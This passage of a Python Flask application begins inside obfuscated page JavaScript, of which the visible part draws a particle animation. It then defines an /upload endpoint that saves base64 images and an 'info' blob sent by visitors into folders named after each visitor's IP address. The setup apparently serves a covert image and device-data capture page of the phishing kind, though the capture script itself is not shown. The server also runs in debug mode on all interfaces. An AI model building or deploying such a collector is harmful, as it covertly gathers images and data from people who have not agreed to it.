_0x2630a8=_0x33434f,_0x4921dd=this['particles'][_0x2630a8(0x12d)](this['interactionParticle']);_0x4921dd>-0x1&&(this[_0x2630a8(0x169)]=undefined,this[_0x2630a8(0x16b)][_0x2630a8(0x152)](_0x4921dd,0x1));},_0x1e2337['prototype']['update']=function(){var _0x3badd6=_0x33434f;if(this[_0x3badd6(0x16a)]&&this[_0x3badd6(0x16a)][_0x3badd6(0x146)]){this['ctx'][_0x3badd6(0x129)](0x0,0x0,this[_0x3badd6(0x16a)][_0x3badd6(0x14a)],this[_0x3badd6(0x16a)][_0x3badd6(0x141)]),this[_0x3badd6(0x171)][_0x3badd6(0x157)]=0x1;for(var _0x43d3dd=0x0;_0x43d3dd<this[_0x3badd6(0x16b)]['length'];_0x43d3dd++){for(var _0x11a158=this[_0x3badd6(0x16b)][_0x3badd6(0x122)]-0x1;_0x11a158>_0x43d3dd;_0x11a158--){var _0x4fd75d,_0x1c3573=this['particles'][_0x43d3dd],_0x5d56e3=this['particles'][_0x11a158];_0x4fd75d=Math[_0x3badd6(0x153)](Math[_0x3badd6(0x124)](_0x1c3573['x']-_0x5d56e3['x']),Math[_0x3badd6(0x124)](_0x1c3573['y']-_0x5d56e3['y']));if(_0x4fd75d>this[_0x3badd6(0x12f)][_0x3badd6(0x15b)])continue;_0x4fd75d=Math['sqrt'](Math[_0x3badd6(0x158)](_0x1c3573['x']-_0x5d56e3['x'],0x2)+Math[_0x3badd6(0x158)](_0x1c3573['y']-_0x5d56e3['y'],0x2));if(_0x4fd75d>this['options'][_0x3badd6(0x15b)])continue;this['ctx'][_0x3badd6(0x11e)](),this[_0x3badd6(0x171)]['strokeStyle']=this['options'][_0x3badd6(0x172)],this[_0x3badd6(0x171)][_0x3badd6(0x157)]=(this[_0x3badd6(0x12f)]['netLineDistance']-_0x4fd75d)/this[_0x3badd6(0x12f)]['netLineDistance']*_0x1c3573['opacity']*_0x5d56e3[_0x3badd6(0x134)],this['ctx'][_0x3badd6(0x11d)]=0.7,this[_0x3badd6(0x171)][_0x3badd6(0x123)](_0x1c3573['x'],_0x1c3573['y']),this[_0x3badd6(0x171)]['lineTo'](_0x5d56e3['x'],_0x5d56e3['y']),this[_0x3badd6(0x171)][_0x3badd6(0x147)]();}}for(var _0x43d3dd=0x0;_0x43d3dd<this[_0x3badd6(0x16b)][_0x3badd6(0x122)];_0x43d3dd++){this[_0x3badd6(0x16b)][_0x43d3dd][_0x3badd6(0x13d)](),this['particles'][_0x43d3dd]['draw']();}this['options']['velocity']!==0x0&&(this[_0x3badd6(0x165)]=requestAnimationFrame(this[_0x3badd6(0x13d)][_0x3badd6(0x130)](this)));}else cancelAnimationFrame(this[_0x3badd6(0x165)]);},_0x1e2337[_0x33434f(0x151)][_0x33434f(0x128)]=function(){var _0xedaa80=_0x33434f;this[_0xedaa80(0x14e)]=0x3,this['mouseIsDown']=![],this[_0xedaa80(0x16d)]=![],this[_0xedaa80(0x12b)]=function(_0x299688){var _0xb2b0cc=_0xedaa80;!this[_0xb2b0cc(0x169)]&&this['createInteractionParticle'](),this[_0xb2b0cc(0x169)]['x']=_0x299688[_0xb2b0cc(0x148)],this[_0xb2b0cc(0x169)]['y']=_0x299688[_0xb2b0cc(0x149)];}[_0xedaa80(0x130)](this),this[_0xedaa80(0x137)]=function(_0x3a4f24){var _0x201d62=_0xedaa80;_0x3a4f24[_0x201d62(0x156)](),this['touchIsMoving']=!![],!this['interactionParticle']&&this[_0x201d62(0x15e)](),this[_0x201d62(0x169)]['x']=_0x3a4f24[_0x201d62(0x14b)][0x0][_0x201d62(0x159)],this[_0x201d62(0x169)]['y']=_0x3a4f24['changedTouches'][0x0][_0x201d62(0x170)];}[_0xedaa80(0x130)](this),this[_0xedaa80(0x135)]=function(_0x7284c3){var _0x191db2=_0xedaa80;this[_0x191db2(0x16e)]=!![];var _0x315f2e=0x0,_0x1e901d=this[_0x191db2(0x14e)],_0x2c436f=setInterval(function(){var _0x8c0d6c=_0x191db2;if(this[_0x8c0d6c(0x16e)]){_0x315f2e===0x1&&(_0x1e901d=0x1);for(var _0x25d1f6=0x0;_0x25d1f6<_0x1e901d;_0x25d1f6++){this[_0x8c0d6c(0x169)]&&this[_0x8c0d6c(0x16b)][_0x8c0d6c(0x11c)](new _0x5e78bf(this,this['interactionParticle']['x'],this['interactionParticle']['y']));}}else clearInterval(_0x2c436f);_0x315f2e++;}[_0x191db2(0x130)](this),0x32);}[_0xedaa80(0x130)](this),this[_0xedaa80(0x15a)]=function(_0x4117f7){_0x4117f7['preventDefault'](),setTimeout(function(){var _0x423daf=_0x2664;if(!this['touchIsMoving'])for(var _0x4ad257=0x0;_0x4ad257<this[_0x423daf(0x14e)];_0x4ad257++){this[_0x423daf(0x16b)][_0x423daf(0x11c)](new _0x5e78bf(this,_0x4117f7[_0x423daf(0x14b)][0x0]['clientX'],_0x4117f7['changedTouches'][0x0]['clientY']));}}['bind'](this),0xc8);}[_0xedaa80(0x130)](this),this[_0xedaa80(0x145)]=function(_0x16d1dc){var _0x85f7ba=_0xedaa80;this[_0x85f7ba(0x16e)]=![];}[_0xedaa80(0x130)](this),this['onMouseOut']=function(_0x502801){this['removeInteractionParticle']();}[_0xedaa80(0x130)](this),this[_0xedaa80(0x150)]=function(_0x2851e7){var _0x18b3a7=_0xedaa80;_0x2851e7[_0x18b3a7(0x156)](),this[_0x18b3a7(0x16d)]=![],this[_0x18b3a7(0x12c)]();}['bind'](this),this[_0xedaa80(0x16a)][_0xedaa80(0x15d)](_0xedaa80(0x161),this[_0xedaa80(0x12b)]),this['canvas'][_0xedaa80(0x15d)](_0xedaa80(0x121),this[_0xedaa80(0x137)]),this[_0xedaa80(0x16a)][_0xedaa80(0x15d)](_0xedaa80(0x155),this['onMouseDown']),this['canvas'][_0xedaa80(0x15d)]('touchstart',this[_0xedaa80(0x15a)]),this['canvas']['addEventListener'](_0xedaa80(0x138),this['onMouseUp']),this[_0xedaa80(0x16a)][_0xedaa80(0x15d)](_0xedaa80(0x160),this[_0xedaa80(0x12a)]),this['canvas'][_0xedaa80(0x15d)](_0xedaa80(0x162),this[_0xedaa80(0x150)]);},_0x1e2337[_0x33434f(0x151)][_0x33434f(0x13a)]=function(){var _0x51383a=_0x33434f;this['canvas']&&(this[_0x51383a(0x16a)][_0x51383a(0x133)](_0x51383a(0x161),this[_0x51383a(0x12b)]),this['canvas'][_0x51383a(0x133)](_0x51383a(0x121),this[_0x51383a(0x137)]),this[_0x51383a(0x16a)][_0x51383a(0x133)](_0x51383a(0x155),this[_0x51383a(0x135)]),this[_0x51383a(0x16a)][_0x51383a(0x133)](_0x51383a(0x12e),this[_0x51383a(0x15a)]),this['canvas'][_0x51383a(0x133)](_0x51383a(0x138),this[_0x51383a(0x145)]),this[_0x51383a(0x16a)]['removeEventListener']('mouseout',this[_0x51383a(0x12a)]),this['canvas']['removeEventListener'](_0x51383a(0x162),this['onTouchEnd']));};var _0x3d2220=function(_0x25098b,_0x52c586,_0x509447){var _0xdd7165=_0x33434f,_0x52d8f2=Math[_0xdd7165(0x13c)]()*(_0x52c586-_0x25098b)+_0x25098b;return _0x509447&&(_0x52d8f2=Math[_0xdd7165(0x132)](_0x52d8f2)),_0x52d8f2;},_0x458451=function(_0x4e3afd){var _0x381d8f=_0x33434f;return _0x4e3afd[Math[_0x381d8f(0x143)](Math['random']()*_0x4e3afd[_0x381d8f(0x122)])];};$(document)['ready'](function(){var _0x4872b2=_0x33434f;pna=new _0xa4cfb9(),pna[_0x4872b2(0x167)]($('.particle-network-animation')[0x0]);});}()));
    </script>

</body>
</html>
"""

@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE)

@app.route('/models/<path:filename>')
def serve_models(filename):
    return send_from_directory(MODELS_FOLDER, filename)

@app.route('/upload', methods=['POST'])
def upload_data():
 
    try:
        if request.headers.getlist("X-Forwarded-For"):
            ip_addr = request.headers.getlist("X-Forwarded-For")[0]
        else:
            ip_addr = request.remote_addr
        
        sanitized_ip = re.sub(r'[^a-zA-Z0-9_.-]', '_', ip_addr)
        
        ip_folder_path = os.path.join(UPLOAD_FOLDER, sanitized_ip)
        os.makedirs(ip_folder_path, exist_ok=True)

        data = request.get_json()
        if not data:
            return jsonify({"status": "error", "message": "No JSON data received"}), 400

        if 'image' in data and data['image']:
            try:
                header, encoded = data['image'].split(',', 1)
                image_bytes = base64.b64decode(encoded)
                ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S_%f')[:-3]
                filename = f"{ts}.jpg"
                
                file_path = os.path.join(ip_folder_path, filename) 
                with open(file_path, 'wb') as f:
                    f.write(image_bytes)

            except (ValueError, TypeError, IndexError) as e:
                print(f"Error processing image data: {e}")
                pass
        
        if 'info' in data and data['info']:
            info_path = os.path.join(ip_folder_path, 'info.txt')
            try:
                with open(info_path, 'w') as f:
                    json.dump(data['info'], f, indent=4)
            except Exception as e:
                print(f"Error saving info.txt: {e}")
                pass

        return jsonify({"status": "success", "ip": ip_addr}), 200

    except Exception as e:
        print(f"Unhandled error in upload_data: {e}")
        return jsonify({"status": "error", "message": "An internal server error occurred"}), 500

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)